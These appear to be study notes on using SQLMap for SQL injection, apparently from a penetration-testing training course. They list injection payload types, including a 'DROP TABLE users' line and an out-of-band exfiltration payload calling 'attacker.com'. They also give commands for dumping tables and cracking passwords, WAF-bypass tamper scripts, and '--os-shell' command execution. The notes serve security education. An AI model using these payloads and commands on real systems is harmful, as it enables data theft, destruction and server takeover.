B – Boolean-based blind

    Example: AND 1=1
    Infers data by comparing true vs false server responses.
    Retrieves 1 byte per request.
    Most common SQLi type in web apps.

E – Error-based

    Example: AND GTID_SUBSET(@@version,0)
    Uses database error messages to extract data.
    Faster than blind types; depends on error visibility.
    Supported by: MySQL, MSSQL, PostgreSQL, Oracle, etc.

U – UNION query-based

    Example: UNION ALL SELECT 1,@@version,3
    Adds attacker’s query results to the original output.
    Fastest method when output is reflected in the page.
    Ideal for dumping whole tables in a single request.

S – Stacked queries

    Example: ; DROP TABLE users
    Executes multiple SQL statements in one go.
    Useful for non-SELECT operations like INSERT or DELETE.
    Supported by MSSQL, PostgreSQL, etc.
    Enables advanced actions like OS command execution.

T – Time-based blind

    Example: AND 1=IF(2>1,SLEEP(5),0)
    Uses response delays to infer true/false conditions.
    Slower than Boolean-based.
    Works when no visible output is available.

Q – Inline queries

    Example: SELECT (SELECT @@version) FROM ...
    Embeds a subquery inside a main query.
    Rare, requires specific query structure.
    Still supported by SQLMap.

Out-of-band

    Example: LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
    Data is exfiltrated through external channels (e.g., DNS).
    Used when other SQLi types are blocked or too slow.
    Requires the server to make outbound connections.
    SQLMap supports this via DNS-based exfiltration.


# SQLMap Output Description

## Log Messages Description

### Log Message:
    "target URL content is stable"
    Server response doesn't change on repeated requests, helping SQLi detection.

### Log Message:
    "GET parameter 'id' appears to be dynamic"
    Parameter affects response – a good sign for possible SQL injection.

### Log Message:
    "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
    Basic test shows potential SQLi; DBMS might be MySQL.

### Log Message:
    "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
    Detected possible XSS vulnerability during heuristic check.

### Log Message:
    "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
    SQLMap found MySQL; suggests skipping payloads for other DBMSes.

### Log Message:
    "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"
    Offers to run extended MySQL-specific SQLi tests.

### Log Message:
    "reflective value(s) found and filtering out"
    Payload reflections detected in response; SQLMap filters them automatically.

### Log Message:
    "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"luther\")"
    Likely Boolean-based blind SQLi; uses string match to distinguish TRUE/FALSE.

### Log Message:
    "time-based comparison requires a larger statistical model, please wait........... (done)"
    Builds response-time model to detect time-based SQLi.

### Log Message:
    "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
    Increases UNION SQLi testing due to signs of other SQLi types.

### Log Message:
    "'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
    ORDER BY is usable; helps find correct column count faster for UNION-based SQLi.

### Log Message:
    "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"
    SQLi confirmed on parameter; optionally test other parameters.

### Log Message:
    "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
    SQLi injection points found and confirmed; details follow.

### Log Message:
    "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
    Results saved to local folder for analysis and reuse.

# Running SQLMap on an HTTP Request

## Curl Commands
Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools. After that, we just have to change curl for sqlmap in terminal

```
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET/POST Requests

In the most common scenario, GET parameters are provided with the usage of option -u/--url. As for testing POST data, the --data

## Full HTTP Requests

#### Tip
```
similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.
```

## Custom SQLMap Requests
SQLMap also supports JSON and XML formatted

-------------
-------------
```
```

# Handling SQLMap Errors 

--parse-errors
-t - stores whole traffic to file
-v (number) - verbose
--proxy - use proxy

# Attack Tuning

Every payload sent to the target consists of:
* vector (UNION ALL SELECT 1,2,version()) - central part of payload
* boundaries (<vector>-- ) - prefix and suffix formations, used to proper injection

## Prefix / Suffix
```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.

```
Code: php

$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);

```

```
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

## Level/Risk

from 1 to 5

## Advanced Tuning
* Status Codes
e.g --code=200

* Titles
e.g --titles - check tag <titles>

* Strings
e.g --string=success - look for string 'success'

* Text-only
e.g --text-only - look for clear text, withou html tags

* Techniques
e.g --technique=BEU 

* UNION SQLi Tuning
In some cases, UNION SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option --union-cols (e.g. --union-cols=17). In case that the default "dummy" filling values used by SQLMap -NULL and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. --union-char='a').

Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the FROM <table> (e.g., in case of Oracle), we can set it with the option --union-from (e.g. --union-from=users).

# Database Enumeration
## Basic DB Data Enumeration


* Database version banner (switch --banner)
* Current user name (switch --current-user)
* Current database name (switch --current-db)
* Checking if the current user has DBA (administrator) rights (switch --is-dba)

```
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

## Table Enumeration
```
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

```

Tip 
```
Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.
```

## Table/Row Enumeration
```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration
```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Full DB Enumeration
```
-dump -D testdb
--dump-all
--exclude-sysdbs (e.g. --dump-all --exclude-sysdbs)
```

# Advanced Database Enumeration
## DB Schema Enumeration
Retrieve the structure of all of the tables - --schema
```
sqlmap -u "http://www.example.com/?id=1" --schema
```
## Searching for Data
```
sqlmap -u "http://www.example.com/?id=1" --search -T user (-T look in table)
sqlmap -u "http://www.example.com/?id=1" --search -C pass (-C look in column)
```

## Password Enumeration and Cracking
```
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

do you want to crack them via a dictionary-based attack? [Y/n/q] Y
```

## DB Users Password Enumeration and Cracking
```
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

Tip 
```
The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.
```

# Bypassing Web Application Protections
https://academy.hackthebox.com/module/58/section/530
## Anti-CSRF Token Bypass
One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.
```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
## Unique Value Bypass
 --randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent:
```
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```
## Calculated Parameter Bypass
Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option --eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target:

```
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

## IP Address Concealing

## WAF Bypass
If one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.
In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.

## User-agent Blacklisting Bypass
Note
```
If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.
```

## Tamper Scripts
Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

| **Tamper Script**             | **Description**                                                                 |
|------------------------------|---------------------------------------------------------------------------------|
| `0eunion`                    | Replaces instances of UNION with `e0UNION`                                      |
| `base64encode`               | Base64-encodes all characters in a given payload                                |
| `between`                    | Replaces `>` with `NOT BETWEEN 0 AND #`, and `=` with `BETWEEN # AND #`        |
| `commalesslimit`             | Replaces `LIMIT M, N` with `LIMIT N OFFSET M` (MySQL)                          |
| `equaltolike`                | Replaces `=` with `LIKE`                                                       |
| `halfversionedmorekeywords` | Adds MySQL versioned comment before each keyword                               |
| `modsecurityversioned`      | Wraps the whole query in a MySQL versioned comment                             |
| `modsecurityzeroversioned`  | Wraps the whole query in a MySQL zero-versioned comment                        |
| `percentage`                 | Adds `%` before each character (e.g. `SELECT` → `%S%E%L%E%C%T`)                |
| `plus2concat`                | Replaces `+` with `CONCAT()` (MsSQL)                                           |
| `randomcase`                 | Randomizes the case of each keyword character (e.g. `SELECT` → `SEleCt`)       |
| `space2comment`             | Replaces space (` `) with comment `/`                                          |
| `space2dash`                | Replaces space with `--<random>\n`                                             |
| `space2hash`                | Replaces space with `#<random>\n` (MySQL)                                      |
| `space2mssqlblank`          | Replaces space with a random blank character valid in MsSQL                    |
| `space2plus`                | Replaces space with `+`                                                         |
| `space2randomblank`         | Replaces space with a random blank character                                   |
| `symboliclogical`           | Replaces `AND`, `OR` with `&&`, `||`                                           |
| `versionedkeywords`         | Encloses each non-function keyword with MySQL versioned comment                |
| `versionedmorekeywords`     | Encloses each keyword with MySQL versioned comment      

```
--list-tampers - show all tampers
```

## Miscellaneous Bypasses

Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.

The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).


# OS Exploitation

## File Read/Write

## Checking for DBA Privileges
* --is-dba (sqlmap -u "http://www.example.com/?id=1" --is-dba)

## Reading Local Files

## Writing Local Files

## OS Command Execution
* sqlmap -u "http://www.example.com/?id=1" --os-shell

Note
```
SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.
```